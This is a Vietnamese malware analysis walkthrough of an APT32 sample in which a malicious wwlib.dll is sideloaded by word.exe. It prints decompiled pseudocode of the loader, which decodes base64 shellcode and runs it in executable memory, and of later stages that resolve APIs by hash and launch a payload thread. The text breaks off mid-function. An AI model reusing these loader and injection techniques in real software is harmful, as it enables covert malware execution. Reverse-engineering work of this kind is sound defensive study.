# Phân tích mã độc APT32

File **wwlib.dll** độc hại được load bởi file **word.exe** bằng hàm **LoadLibraryW** rồi gọi hàm export **FMain**:

```C++
signed int __stdcall sub_30001573(int a1, int a2, int a3, int a4)
{
  HMODULE v4; // edi
  FARPROC v5; // ebx
  FARPROC v6; // eax
  signed int result; // eax

  v4 = LoadLibraryW(L"wwlib.dll");
  if ( v4 || (v4 = (HMODULE)sub_30001968(L"{0638C49D-BB8B-4CD1-B191-051E8F325736}")) != 0 )
  {
    v5 = GetProcAddress(v4, "FMain");//Lấy địa chỉ hàm FMain lưu vào biến v5
    dword_30003010 = (int)GetProcAddress(v4, "wdCommandDispatch");
    v6 = GetProcAddress(v4, "wdGetApplicationObject");
    dword_3000300C = (int)v6;
    if ( v5 && dword_30003010 && v6 )
    {
      ((void (__stdcall *)(int, int, int, int))v5)(a1, a2, a3, a4);//Gọi hàm FMain
      FreeLibrary(v4);
      result = 0;
    }
    else
    {
      result = 1;
    }
  }
  else
  {
    GetLastError();
    result = 1;
  }
  return result;
}
```

Thử mở file `wwlib.dll` bằng IDA Pro xem sao, danh sách export của wwlib.dll như này:

![Screenshot](/img1.png?raw=true "Screenshot")

Nội dung hàm FMain:

```C++
int FMain()
{
  void *v0; // ecx
  unsigned int v1; // eax
  char *v2; // ecx
  char v4; // [esp-18h] [ebp-38h]
  int v5; // [esp-14h] [ebp-34h]
  int v6; // [esp-10h] [ebp-30h]
  int v7; // [esp-Ch] [ebp-2Ch]
  SIZE_T v8; // [esp-8h] [ebp-28h]
  int v9; // [esp-4h] [ebp-24h]
  LPVOID lpMem; // [esp+4h] [ebp-1Ch]
  unsigned int v11; // [esp+18h] [ebp-8h]

  SetErrorMode(0x8007u);
  sub_6D981040(&lpMem);
  v9 = 15;
  v8 = 0;
  v4 = 0;
  sub_6D981660(&v4, (int)&lpMem, 0, -1);
  sub_6D981230(*(void **)&v4, v5, v6, v7, v8, v9);
  if ( v11 >= 0x10 )
  {
    v0 = lpMem;
    if ( v11 + 1 >= 0x1000 )
    {
      if ( (unsigned __int8)lpMem & 0x1F )
        _invalid_parameter_noinfo_noreturn(lpMem);
      v1 = *((_DWORD *)lpMem - 1);
      if ( v1 >= (unsigned int)lpMem )
        _invalid_parameter_noinfo_noreturn(lpMem);
      v2 = (char *)lpMem - v1;
      if ( (char *)lpMem - v1 < (char *)4 )
        _invalid_parameter_noinfo_noreturn(v2);
      if ( (unsigned int)v2 > 0x23 )
        _invalid_parameter_noinfo_noreturn(v2);
      v0 = (void *)*((_DWORD *)lpMem - 1);
    }
    j_j___free_base(v0);
  }
  return 0;
}
```
Để có thể debug được file dll này, chúng ta cần chọn đường dẫn Application tới file `word.exe`. Cụ thể thiết lập Process Options như sau:

![Screenshot](/img10.png?raw=true "Screenshot")

Đặt 1 breakpoint ở hàm FMain và nhấn nút Start Process:

![Screenshot](/img11.png?raw=true "Screenshot")


Từ hàm **FMain**, hàm **sub_6D981040** sẽ được gọi đầu tiên.

```C++
_DWORD *__fastcall sub_6D981040(_DWORD *a1)
{
  _DWORD *v1; // edi
  int v2; // esi
  signed int v3; // eax
  char *v4; // ecx
  unsigned __int8 v5; // bl
  signed int v6; // esi
  char *v7; // ecx
  signed int v8; // esi
  signed int v9; // eax
  bool v10; // cf
  signed int v11; // ebx
  int v12; // ecx
  int v13; // esi
  int v14; // ebx
  int v16; // [esp-8h] [ebp-44h]
  int v17; // [esp-4h] [ebp-40h]
  int v18; // [esp+18h] [ebp-24h]
  char *v19; // [esp+1Ch] [ebp-20h]
  char v20; // [esp+20h] [ebp-1Ch]
  char v21; // [esp+21h] [ebp-1Bh]
  char i; // [esp+22h] [ebp-1Ah]
  char *v23; // [esp+24h] [ebp-18h]
  char v24; // [esp+28h] [ebp-14h]
  int v25; // [esp+38h] [ebp-4h]

  v1 = a1;
  v2 = 0;
  a1[5] = 15;
  v3 = 8965;
  v10 = a1[5] < 0x10u;
  a1[4] = 0;
  if ( !v10 )
    a1 = (_DWORD *)*a1;
  *(_BYTE *)a1 = 0;
  v4 = a6aaaaabzgKfjym;//chuỗi base64 chứa shellcode
  v25 = 0;
  v19 = a6aaaaabzgKfjym;//chuỗi base64 chứa shellcode
  do
  {
    v5 = *v4;
    v18 = v3 - 1;
    if ( *v4 == 61 || !isalnum(v5) && v5 != 43 && v5 != 47 )
      break;
    v4 = v19 + 1;
    *((_BYTE *)&v23 + v2++) = *v19++;
    if ( v2 == 4 )
    {
      v6 = 0;
      do
      {
        v24 = *((_BYTE *)&v23 + v6);
        *((_BYTE *)&v23 + v6++) = find_in_base64_table(&v24, v16, v17);
      }
      while ( v6 < 4 );
      v20 = 4 * (_BYTE)v23 + ((BYTE1(v23) >> 4) & 3);
      LOBYTE(v7) = 16 * BYTE1(v23) + ((BYTE2(v23) >> 2) & 0xF);
      v21 = 16 * BYTE1(v23) + ((BYTE2(v23) >> 2) & 0xF);
      v8 = 0;
      i = (BYTE2(v23) << 6) + (HIBYTE(v23) & 0x3F);
      do
        sub_6D981780(v1, (int)v7, *(&v20 + v8++));
      while ( v8 < 3 );
      v4 = v19;
      v2 = 0;
    }
    v3 = v18;
  }
  while ( v18 );
  if ( v2 )
  {
    v9 = 0;
    v10 = 1;
    do
    {
      if ( !v10 )
      {
        __report_rangecheckfailure();
        JUMPOUT(*(_DWORD *)algn_6D981226);
      }
      *((_BYTE *)&v23 + v9++) = 0;
      v10 = (unsigned int)v9 < 4;
    }
    while ( v9 < 4 );
    v11 = 0;
    do
    {
      v24 = *((_BYTE *)&v23 + v11);
      *((_BYTE *)&v23 + v11++) = find_in_base64_table(&v24, v16, v17);
    }
    while ( v11 < 4 );
    v13 = v2 - 1;
    v20 = 4 * (_BYTE)v23 + ((BYTE1(v23) >> 4) & 3);
    v14 = 0;
    LOBYTE(v12) = 16 * BYTE1(v23) + ((BYTE2(v23) >> 2) & 0xF);
    v21 = 16 * BYTE1(v23) + ((BYTE2(v23) >> 2) & 0xF);
    for ( i = (BYTE2(v23) << 6) + (HIBYTE(v23) & 0x3F); v14 < v13; ++v14 )
      sub_6D981780(v1, v12, *(&v20 + v14));
  }
  return v1;
}
```
trong đó **a6aaaaabzgKfjym** chính là biến lưu chuỗi base64:

![Screenshot](/img2.png?raw=true "Screenshot")

Tóm lại, hàm `sub_6D981040` decode 1 chuỗi base64 (đây chính là shellcode của mã độc) và lưu kết quả đã decode vào 1 vùng nhớ vừa cấp phát và thực thi shellcode.


Quay lại hàm `FMain`, nó tiếp tục gọi hàm **sub_6D981660**, nhưng hàm này khá lằng nhằng nên tôi bỏ qua không quan tâm luôn 😁😁😁.

Sau đó hàm **sub_6D981230** được gọi.

```C++
int __cdecl sub_6D981230(void *lpMem, int a2, int a3, int a4, SIZE_T dwSize, int a6)
{
  void (*v6)(void); // eax
  const void *v7; // ecx
  void (*v8)(void); // esi
  void *v9; // ecx
  unsigned int v10; // eax
  char *v11; // ecx

  v6 = (void (*)(void))VirtualAlloc(0, dwSize, 0x1000u, 0x40u);//cấp phát vùng nhớ
  v7 = &lpMem;
  if ( (unsigned int)a6 >= 0x10 )
    v7 = lpMem;
  v8 = v6;
  memmove_0(v6, v7, dwSize);//copy shellcode vào vùng nhớ
  v8(); //thực thi shellcode (đặt breakpoint tại đây)
  if ( (unsigned int)a6 >= 0x10 )
  {
    v9 = lpMem;
    if ( (unsigned int)(a6 + 1) >= 0x1000 )
    {
      if ( (unsigned __int8)lpMem & 0x1F )
        _invalid_parameter_noinfo_noreturn(lpMem);
      v10 = *((_DWORD *)lpMem - 1);
      if ( v10 >= (unsigned int)lpMem )
        _invalid_parameter_noinfo_noreturn(lpMem);
      v11 = (char *)lpMem - v10;
      if ( (char *)lpMem - v10 < (char *)4 )
        _invalid_parameter_noinfo_noreturn(v11);
      if ( (unsigned int)v11 > 0x23 )
        _invalid_parameter_noinfo_noreturn(v11);
      v9 = (void *)*((_DWORD *)lpMem - 1);
    }
    j_j___free_base(v9);
  }
  return 1;
}
```

Đầu tiên, mã độc gọi hàm **VirtualAlloc** để cấp phát 1 vùng nhớ lưu mã thực thi. Sau đó gọi hàm **memmove_0** để copy dữ liệu base64 đã decode ở trên vào vùng nhớ đó (`v6 -> v8`), cuối cùng mã độc gọi `v8()` để thực thi shellcode.

Tiến hành đặt breakpoint ngay dòng `v8()` và debug, tới breakpoint nhấn **F7** để `Step In` vào shellcode. 

![Screenshot](/img3.png?raw=true "Screenshot")

Tiếp tục nhấn F8 cho tới đoạn `call    near ptr unk_1A0016`, nhấn F7 -> nhấn P để tạo function -> nhấn F5 để xem mã giả, thu được hàm `unk_1A0016` như sau:

```C++
char __stdcall sub_1A0016(_DWORD *a1)
{
  int v1; // eax
  int v2; // eax
  _DWORD *v3; // ebx
  unsigned __int16 *v4; // edx
  void **v5; // esi
  unsigned __int16 v6; // ax
  unsigned __int16 v7; // cx
  int v8; // edi
  int v9; // eax
  int v10; // ecx
  int v11; // ecx
  int v12; // edx
  int v13; // esi
  unsigned int v14; // ebx
  int v15; // edx
  unsigned int v16; // eax
  int v17; // esi
  _BYTE *v18; // ebx
  int v19; // edi
  int v20; // ecx
  int v21; // eax
  int *v22; // ebx
  signed int v23; // edi
  int v24; // ST14_4
  int *v25; // esi
  int v26; // eax
  int v27; // ebx
  int v28; // esi
  int v29; // edi
  int v30; // ecx
  int v31; // edx
  int v32; // ecx
  int v33; // ecx
  int v34; // eax
  unsigned int v35; // eax
  unsigned int v36; // edx
  int v37; // eax
  int v38; // edi
  _BYTE *v39; // ebx
  int v40; // ecx
  int v41; // esi
  int v42; // eax
  _DWORD *v43; // edi
  int v44; // ebx
  int v45; // edx
  int v46; // ecx
  int v47; // esi
  int v48; // eax
  int v49; // edi
  int v50; // edx
  int v51; // eax
  int v52; // eax
  unsigned int v53; // ebx
  int v54; // ebx
  int v55; // edx
  int v56; // eax
  int v57; // edi
  int v58; // eax
  int v59; // edi
  int v60; // edi
  int v61; // edx
  int v62; // eax
  int v63; // eax
  bool v64; // cf
  _BYTE *v65; // ebx
  int v66; // edi
  char *v67; // ebx
  char v68; // al
  int v69; // eax
  int v71; // [esp+14h] [ebp-12Ch]
  char **v72; // [esp+14h] [ebp-12Ch]
  int v73; // [esp+14h] [ebp-12Ch]
  int v74; // [esp+18h] [ebp-128h]
  int v75; // [esp+18h] [ebp-128h]
  int (__stdcall *v76)(int); // [esp+1Ch] [ebp-124h]
  int v77; // [esp+1Ch] [ebp-124h]
  _DWORD *v78; // [esp+20h] [ebp-120h]
  int v79; // [esp+20h] [ebp-120h]
  signed int v80; // [esp+20h] [ebp-120h]
  int v81; // [esp+20h] [ebp-120h]
  unsigned int v82; // [esp+24h] [ebp-11Ch]
  unsigned int v83; // [esp+24h] [ebp-11Ch]
  int v84; // [esp+28h] [ebp-118h]
  int v85; // [esp+2Ch] [ebp-114h]
  __int16 v86; // [esp+30h] [ebp-110h]
  char v87; // [esp+32h] [ebp-10Eh]
  int v88; // [esp+34h] [ebp-10Ch]
  int v89; // [esp+38h] [ebp-108h]
  int v90; // [esp+3Ch] [ebp-104h]
  int v91; // [esp+40h] [ebp-100h]
  int v92; // [esp+44h] [ebp-FCh]
  int v93; // [esp+48h] [ebp-F8h]
  int v94; // [esp+4Ch] [ebp-F4h]
  int *v95; // [esp+50h] [ebp-F0h]
  void *v96; // [esp+58h] [ebp-E8h]
  int v97; // [esp+5Ch] [ebp-E4h]
  int v98; // [esp+60h] [ebp-E0h]
  int v99; // [esp+64h] [ebp-DCh]
  void *v100; // [esp+68h] [ebp-D8h]
  int v101; // [esp+6Ch] [ebp-D4h]
  int v102; // [esp+70h] [ebp-D0h]
  unsigned int v103; // [esp+74h] [ebp-CCh]
  int v104; // [esp+78h] [ebp-C8h]
  int v105; // [esp+7Ch] [ebp-C4h]
  int v106; // [esp+80h] [ebp-C0h]
  int v107; // [esp+84h] [ebp-BCh]
  _DWORD *v108; // [esp+88h] [ebp-B8h]
  int v109; // [esp+8Ch] [ebp-B4h]
  int v110; // [esp+90h] [ebp-B0h]
  int v111; // [esp+94h] [ebp-ACh]
  int v112; // [esp+98h] [ebp-A8h]
  int v113; // [esp+9Ch] [ebp-A4h]
  int v114; // [esp+A0h] [ebp-A0h]
  int v115; // [esp+A4h] [ebp-9Ch]
  int *v116; // [esp+A8h] [ebp-98h]
  __int16 v117; // [esp+ACh] [ebp-94h]
  int *v118; // [esp+B0h] [ebp-90h]
  char *v119; // [esp+B4h] [ebp-8Ch]
  int *v120; // [esp+B8h] [ebp-88h]
  __int16 v121; // [esp+BCh] [ebp-84h]
  int *v122; // [esp+C0h] [ebp-80h]
  char *v123; // [esp+C4h] [ebp-7Ch]
  int v124; // [esp+C8h] [ebp-78h]
  int v125; // [esp+CCh] [ebp-74h]
  int v126; // [esp+D0h] [ebp-70h]
  int v127; // [esp+D4h] [ebp-6Ch]
  int v128; // [esp+D8h] [ebp-68h]
  int v129; // [esp+DCh] [ebp-64h]
  int v130; // [esp+E0h] [ebp-60h]
  int v131; // [esp+E4h] [ebp-5Ch]
  int v132; // [esp+E8h] [ebp-58h]
  int v133; // [esp+ECh] [ebp-54h]
  char v134; // [esp+F0h] [ebp-50h]
  int (__stdcall *v135)(_DWORD, _DWORD, signed int, signed int); // [esp+FCh] [ebp-44h]
  int (__stdcall *v136)(_DWORD, _DWORD, int, _DWORD, _DWORD, _DWORD); // [esp+100h] [ebp-40h]
  void (__stdcall *v137)(int, signed int); // [esp+104h] [ebp-3Ch]
  int (__stdcall *v138)(int, _DWORD, signed int); // [esp+108h] [ebp-38h]
  char v139; // [esp+110h] [ebp-30h]

  v1 = *(_DWORD *)(__readfsdword(0x18u) + 48);
  v96 = &unk_65006B;
  v97 = 7209074;
  v98 = 7077989;
  v2 = *(_DWORD *)(v1 + 12);
  v99 = 3276851;
  v100 = &unk_64002E;
  v101 = 7077996;
  v78 = *(_DWORD **)(v2 + 20);
  v3 = *(_DWORD **)(v2 + 20);
  LOWORD(v102) = 0;
  while ( 1 )
  {
    v4 = (unsigned __int16 *)v3[10];
    v5 = &v96;
    v6 = *v4;
    if ( *v4 )
    {
      while ( *(_WORD *)v5 )
      {
        v7 = *(_WORD *)v5 | 0x20;
        v8 = v6 | 0x20;
        v9 = v7;
        if ( (_WORD)v8 != v7 )
        {
          v10 = v8;
          goto LABEL_7;
        }
        v6 = v4[1];
        ++v4;
        v5 = (void **)((char *)v5 + 2);
        if ( !v6 )
          break;
      }
    }
    v9 = *(unsigned __int16 *)v5 | 0x20;
    v10 = *v4 | 0x20;
LABEL_7:
    if ( v10 == v9 )
      break;
    v3 = (_DWORD *)*v3;
    if ( v3 == v78 || !v3[6] )
      return v9;
  }
  v11 = v3[4];
  v71 = v11;
  if ( !v11 )
    return v9;
  v12 = *(_DWORD *)(v11 + 60);
  v76 = 0;
  v13 = *(_DWORD *)(v12 + v11 + 120);
  if ( !v13 )
    goto LABEL_23;
  if ( (unsigned int)(v13 + *(_DWORD *)(v12 + v11 + 124)) >= *(_DWORD *)(v12 + v11 + 80) )
    goto LABEL_23;
  v14 = *(_DWORD *)(v13 + v11 + 24);
  v15 = v11 + *(_DWORD *)(v13 + v11 + 32);
  v92 = v11 + *(_DWORD *)(v13 + v11 + 36);
  v76 = 0;
  v93 = v11 + *(_DWORD *)(v13 + v11 + 28);
  v16 = 0;
  v79 = v15;
  v82 = v14;
  v74 = 0;
  if ( !v14 )
    goto LABEL_23;
  while ( 1 )
  {
    v17 = 0;
    v18 = (_BYTE *)(v11 + *(_DWORD *)(v15 + 4 * v16));
    v19 = 0;
    if ( *v18 )
      break;
LABEL_20:
    v74 = ++v16;
    if ( v16 >= v82 )
      goto LABEL_23;
  }
  do
  {
    v20 = (char)v18[v19] % 16;
    v21 = v19 + (char)v18[v19] / 16;
    ++v19;
    v17 = 16 * v20 + v21 + 3 * v17;
  }
  while ( v18[v19] );
  v16 = v74;
  if ( v17 != 50823829 )
  {
    v11 = v71;
    v15 = v79;
    goto LABEL_20;
  }
  v76 = (int (__stdcall *)(int))(v71 + *(_DWORD *)(v93 + 4 * *(unsigned __int16 *)(v92 + 2 * v74)));
LABEL_23:
  v88 = 1852990827;
  v116 = &v88;
  v22 = (int *)&v119;
  v89 = 842230885;
  v117 = 7;
  v23 = 2;
  v90 = 1819042862;
  v118 = &v109;
  v119 = &v134;
  v120 = &v84;
  v121 = 10;
  v122 = &v124;
  LOBYTE(v91) = 0;
  v109 = 247252859;
  v110 = 50823829;
  v111 = 28379480;
  v112 = 13732044;
  v113 = 1016389420;
  v114 = 9460038;
  v115 = 10736;
  v84 = 1668707181;
  v85 = 1680766066;
  v86 = 27756;
  v87 = 0;
  v124 = 39303;
  v125 = 23003;
  v126 = 22618;
  v127 = 21006;
  v128 = 65583;
  v129 = 65749;
  v130 = 61883;
  v131 = 51933;
  v132 = 66060;
  v133 = 3467;
  v123 = &v139;
  v72 = &v119;
  v80 = 2;
  do
  {
    v24 = *(v22 - 3);
    v95 = (int *)*v22;
    v25 = v95;
    *v25 = v76(v24);
    v26 = *((unsigned __int16 *)v22 - 4);
    v27 = 0;
    v94 = v26;
    v75 = 0;
    if ( v26 )
    {
      v108 = v25 + 1;
      do
      {
        v28 = *v25;
        v29 = 0;
        v93 = v28;
        v30 = *(_DWORD *)(v28 + 60);
        v31 = *(_DWORD *)(v30 + v28 + 120);
        if ( v31 )
        {
          if ( (unsigned int)(v31 + *(_DWORD *)(v30 + v28 + 124)) < *(_DWORD *)(v30 + v28 + 80) )
          {
            v32 = *(_DWORD *)(v31 + v28 + 32);
            v106 = v28 + *(_DWORD *)(v31 + v28 + 36);
            v33 = v28 + v32;
            v34 = v28 + *(_DWORD *)(v31 + v28 + 28);
            v105 = 0;
            v107 = v34;
            v35 = *(_DWORD *)(v31 + v28 + 24);
            v36 = 0;
            v104 = v33;
            v103 = v35;
            v83 = 0;
            if ( v35 )
            {
              v37 = *(_DWORD *)&(*(v72 - 1))[4 * v27];
              v92 = *(_DWORD *)&(*(v72 - 1))[4 * v27];
              while ( 1 )
              {
                v38 = 0;
                v39 = (_BYTE *)(v28 + *(_DWORD *)(v33 + 4 * v36));
                v40 = 0;
                if ( *v39 )
                {
                  do
                  {
                    v41 = (char)v39[v38] % 16;
                    v42 = v38 + (char)v39[v38] / 16;
                    ++v38;
                    v40 = 16 * v41 + v42 + 3 * v40;
                  }
                  while ( v39[v38] );
                  v36 = v83;
                  v28 = v93;
                  v37 = v92;
                }
                if ( v40 == v37 )
                  break;
                v33 = v104;
                v83 = ++v36;
                if ( v36 >= v103 )
                {
                  v29 = v105;
                  goto LABEL_37;
                }
              }
              v29 = v28 + *(_DWORD *)(v107 + 4 * *(unsigned __int16 *)(v106 + 2 * v36));
LABEL_37:
              v27 = v75;
            }
          }
        }
        v25 = v95;
        v108[v27++] = v29;
        v75 = v27;
      }
      while ( v27 < v94 );
      v23 = v80;
    }
    v22 = (int *)(v72 + 4);
    --v23;
    v72 += 4;
    v80 = v23;
  }
  while ( v23 );
  v43 = a1;
  v9 = v135(0, *a1, 12288, 64);//kernel32_VirtualAlloc
  //cấp phát vùng nhớ lưu shellcode bằng hàm VirtualAlloc
  //cần đặt breakpoint sau hàm này để lấy địa chỉ vùng nhớ
  //trước khi gọi hàm CreateThread bên dưới, phải đặt
  //breakpoint ở vùng nhớ này trước
  v44 = v9;
  v77 = v9;
  if ( !v9 )
    return v9;
  v45 = 0;
  v46 = 0;
  v94 = a1[1];
  v47 = 0;
  v81 = 1;
  while ( 2 )
  {
    while ( 1 )
    {
      if ( v45 & 0x7F )
      {
        v45 *= 2;
      }
      else
      {
        v48 = *((unsigned __int8 *)v43 + v46++ + 8);
        v45 = 2 * v48 + 1;
      }
      if ( !(v45 & 0x100) )
        break;
      *(_BYTE *)(v47++ + v44) = *((_BYTE *)v43 + v46++ + 8);
    }
    v49 = 1;
    do
    {
      if ( v45 & 0x7F )
      {
        v50 = 2 * v45;
      }
      else
      {
        v51 = *((unsigned __int8 *)a1 + v46++ + 8);
        v50 = 2 * v51 + 1;
      }
      v49 = ((unsigned __int8)v50 >> 8) + 2 * v49;
      if ( v50 & 0x7F )
      {
        v45 = 2 * v50;
      }
      else
      {
        v52 = *((unsigned __int8 *)a1 + v46++ + 8);
        v45 = 2 * v52 + 1;
      }
    }
    while ( !(v45 & 0x100) );
    v73 = v46;
    if ( v49 == 2 )
    {
      v53 = v81;
LABEL_60:
      if ( v45 & 0x7F )
      {
        v55 = 2 * v45;
      }
      else
      {
        v56 = *((unsigned __int8 *)a1 + v46++ + 8);
        v73 = v46;
        v55 = 2 * v56 + 1;
      }
      v57 = (unsigned __int8)v55 >> 8;
      if ( v55 & 0x7F )
      {
        v45 = 2 * v55;
      }
      else
      {
        v58 = *((unsigned __int8 *)a1 + v46++ + 8);
        v73 = v46;
        v45 = 2 * v58 + 1;
      }
      v59 = ((unsigned __int8)v45 >> 8) + 2 * v57;
      if ( !v59 )
      {
        v60 = 1;
        do
        {
          if ( v45 & 0x7F )
          {
            v61 = 2 * v45;
          }
          else
          {
            v62 = *((unsigned __int8 *)a1 + v46++ + 8);
            v61 = 2 * v62 + 1;
          }
          v60 = ((unsigned __int8)v61 >> 8) + 2 * v60;
          if ( v61 & 0x7F )
          {
            v45 = 2 * v61;
          }
          else
          {
            v63 = *((unsigned __int8 *)a1 + v46++ + 8);
            v45 = 2 * v63 + 1;
          }
        }
        while ( !(v45 & 0x100) );
        v59 = v60 + 2;
        v73 = v46;
      }
      v64 = v53 > 0xD00;
      v65 = (_BYTE *)(v77 + v47 - v53);
      v95 = (int *)(v64 + v59);
      *(_BYTE *)(v47++ + v77) = *v65;
      v66 = (int)v95;
      v67 = v65 + 1;
      do
      {
        v68 = *v67++;
        *(_BYTE *)(v47++ + v77) = v68;
        --v66;
      }
      while ( v66 );
      v46 = v73;
      v44 = v77;
      v43 = a1;
      continue;
    }
    break;
  }
  v9 = *((unsigned __int8 *)a1 + v46++ + 8);
  v73 = v46;
  v54 = v9 + (v49 << 8) - 768;
  if ( v54 != -1 )
  {
    v53 = v9 + (v49 << 8) - 768 + 1;
    v81 = v9 + (v49 << 8) - 768 + 1;
    goto LABEL_60;
  }
  if ( v46 == v94 )
  {
    if ( v47 == *a1 )
    {
      //đặt breakpoint tại đây, nhảy vào vùng nhớ đã cấp phát ở trên
      //Nhấn C để chuyển Data sang Code, đặt breakpoint trước khi
      //gọi hàm CreateThread và WaitForSingleObject
      v69 = v136(0, 0, v77, 0, 0, 0);//kernel32_CreateThread
      v137(v69, -1);//kernel32_WaitForSingleObject
      LOBYTE(v9) = v138(v77, *a1, 0x8000);
    }
  }
  else
  {
    LOBYTE(v9) = 0;
  }
  return v9;
}
```
Có vẻ đoạn chương trình đã bị obfuscate nên khá rối rắm, tuy nhiên chúng ta chỉ cần chú ý 2 chỗ tôi đã comment.
Chương trình có gọi một số hàm thông qua biến, vì thế cách đơn giản nhất là debug tới những lệnh gọi này và nhấn F7 sẽ biết nó gọi hàm gì:

![Screenshot](/img4.png?raw=true "Screenshot")

![Screenshot](/img5.png?raw=true "Screenshot")

-> `v135` chính là địa chỉ của hàm `VirtualAlloc` nằm trong thư viện `kernel32.dll`. 

Sau khi tạo vùng nhớ, mã độc lại copy shellcode mới vào biến `v9`. Bằng cách debug tương tự, chúng ta có thể thấy `v136` là hàm `CreateThread` và `v137` là hàm `WaitForSingleObject`. Vậy có nghĩa là mã độc tạo thread mới gọi tới địa chỉ của shellcode, sau đó gọi hàm `WaitForSingleObject` để chờ thread chạy xong.

Để có thể đặt breakpoint ở shellcode, chúng ta cần dừng chương trình ở ngay lệnh gọi hàm `CreateThread` (chi tiết xem comment ở trong đoạn đoạn chương trình ở trên).

![Screenshot](/img6.png?raw=true "Screenshot")

Nhảy vào vùng nhớ được tạo ở trên (biến `v9`), nhấn C để chuyển data sang code, đặt breakpoint và debug tương tự như ở trên.

Chúng ta sẽ thu được đoạn chương trình khác

```C++
int __stdcall sub_5F0016(int a1)
{
  int v1; // eax
  int v2; // eax
  _DWORD *v3; // ebx
  unsigned __int16 *v4; // edx
  int *v5; // esi
  unsigned __int16 v6; // ax
  unsigned __int16 v7; // cx
  int v8; // edi
  int result; // eax
  int v10; // ecx
  int v11; // ecx
  int v12; // edx
  int v13; // esi
  unsigned int v14; // ebx
  int v15; // edx
  int v16; // eax
  unsigned int v17; // eax
  int v18; // esi
  _BYTE *v19; // ebx
  int v20; // edi
  int v21; // ecx
  int v22; // eax
  unsigned int *v23; // ebx
  signed int v24; // edi
  int v25; // ST98_4
  int *v26; // esi
  int v27; // eax
  int v28; // ebx
  int v29; // edx
  int v30; // edi
  int v31; // ecx
  int v32; // esi
  unsigned int v33; // ecx
  int v34; // eax
  int v35; // edi
  int v36; // edi
  int v37; // eax
  unsigned int v38; // eax
  int v39; // esi
  _BYTE *v40; // ebx
  int v41; // edi
  int v42; // ecx
  int v43; // eax
  _BYTE *v44; // eax
  const char *v45; // edi
  const char *v46; // ebx
  int v47; // esi
  int v48; // ecx
  int v49; // esi
  int v50; // esi
  int v51; // eax
  unsigned int v52; // edx
  char v53; // cl
  int v54; // edi
  int v55; // eax
  unsigned int v56; // edx
  char v57; // cl
  int v58; // eax
  int v59; // esi
  int v60; // ebx
  signed int v61; // eax
  _DWORD *v62; // ecx
  int v63; // ecx
  signed int v64; // edi
  int v65; // ebx
  int v66; // eax
  signed int v67; // edi
  int v68; // edx
  int v69; // esi
  int v70; // eax
  _DWORD *v71; // edi
  int v72; // ebx
  int v73; // edi
  char v74; // al
  signed int v75; // ebx
  signed int v76; // eax
  unsigned int v77; // edx
  bool v78; // zf
  unsigned int v79; // ecx
  const char *v80; // esi
  unsigned int v81; // edx
  const char *v82; // esi
  char v83; // cl
  int v84; // esi
  int v85; // eax
  unsigned int v86; // edx
  const char *v87; // esi
  char v88; // cl
  int v89; // esi
  int v90; // eax
  int v91; // ebx
  unsigned int v92; // ett
  int v93; // esi
  int v94; // ecx
  int v95; // edi
  int v96; // eax
  int v97; // esi
  unsigned int v98; // eax
  unsigned int v99; // esi
  int v100; // eax
  int v101; // [esp+A8h] [ebp-204h]
  unsigned int v102; // [esp+A8h] [ebp-204h]
  unsigned int v103; // [esp+ACh] [ebp-200h]
  int v104; // [esp+ACh] [ebp-200h]
  int v105; // [esp+ACh] [ebp-200h]
  unsigned int v106; // [esp+ACh] [ebp-200h]
  int v107; // [esp+B0h] [ebp-1FCh]
  signed int v108; // [esp+B0h] [ebp-1FCh]
  int v109; // [esp+B4h] [ebp-1F8h]
  signed int v110; // [esp+B4h] [ebp-1F8h]
  unsigned int v111; // [esp+B4h] [ebp-1F8h]
  char **v112; // [esp+B8h] [ebp-1F4h]
  unsigned int v113; // [esp+BCh] [ebp-1F0h]
  int v114; // [esp+C0h] [ebp-1ECh]
  int v115; // [esp+C4h] [ebp-1E8h]
  const char *v116; // [esp+C8h] [ebp-1E4h]
  const char *v117; // [esp+CCh] [ebp-1E0h]
  unsigned int v118; // [esp+D0h] [ebp-1DCh]
  int v119; // [esp+D4h] [ebp-1D8h]
  unsigned int v120; // [esp+D8h] [ebp-1D4h]
  unsigned int v121; // [esp+DCh] [ebp-1D0h]
  int i; // [esp+E0h] [ebp-1CCh]
  int v123; // [esp+E4h] [ebp-1C8h]
  int v124; // [esp+E8h] [ebp-1C4h]
  int v125; // [esp+ECh] [ebp-1C0h]
  int v126; // [esp+F0h] [ebp-1BCh]
  int v127; // [esp+F4h] [ebp-1B8h]
  int v128; // [esp+F8h] [ebp-1B4h]
  char v129; // [esp+FCh] [ebp-1B0h]
  int v130; // [esp+100h] [ebp-1ACh]
  int v131; // [esp+104h] [ebp-1A8h]
  int v132; // [esp+108h] [ebp-1A4h]
  char v133; // [esp+10Ch] [ebp-1A0h]
  int v134; // [esp+110h] [ebp-19Ch]
  int v135; // [esp+114h] [ebp-198h]
  int v136; // [esp+118h] [ebp-194h]
  int v137; // [esp+11Ch] [ebp-190h]
  int v138; // [esp+120h] [ebp-18Ch]
  int v139; // [esp+124h] [ebp-188h]
  int v140; // [esp+128h] [ebp-184h]
  int v141; // [esp+12Ch] [ebp-180h]
  unsigned int v142; // [esp+130h] [ebp-17Ch]
  unsigned int v143; // [esp+134h] [ebp-178h]
  int v144; // [esp+13Ch] [ebp-170h]
  int v145; // [esp+140h] [ebp-16Ch]
  int v146; // [esp+144h] [ebp-168h]
  int v147; // [esp+148h] [ebp-164h]
  int v148; // [esp+14Ch] [ebp-160h]
  int v149; // [esp+150h] [ebp-15Ch]
  int v150; // [esp+154h] [ebp-158h]
  int v151; // [esp+158h] [ebp-154h]
  __int16 v152; // [esp+15Ch] [ebp-150h]
  int v153; // [esp+160h] [ebp-14Ch]
  char v154; // [esp+164h] [ebp-148h]
  int (__stdcall *v155)(_DWORD, unsigned int, signed int, signed int); // [esp+170h] [ebp-13Ch]
  int (__stdcall *v156)(_DWORD, _DWORD, unsigned int, _DWORD, _DWORD, _DWORD); // [esp+174h] [ebp-138h]
  void (__stdcall *v157)(int, signed int); // [esp+178h] [ebp-134h]
  void (__stdcall *v158)(unsigned int, unsigned int, signed int); // [esp+17Ch] [ebp-130h]
  char v159; // [esp+184h] [ebp-128h]
  int (__cdecl *v160)(int); // [esp+188h] [ebp-124h]
  int (__cdecl *v161)(int, signed int); // [esp+18Ch] [ebp-120h]
  int (__cdecl *v162)(const char *); // [esp+190h] [ebp-11Ch]
  void (__cdecl *v163)(int); // [esp+194h] [ebp-118h]
  void (__cdecl *v164)(int, int, int); // [esp+198h] [ebp-114h]
  void (__cdecl *v165)(int, _DWORD, unsigned int); // [esp+19Ch] [ebp-110h]
  int (__cdecl *v166)(signed int); // [esp+1A0h] [ebp-10Ch]
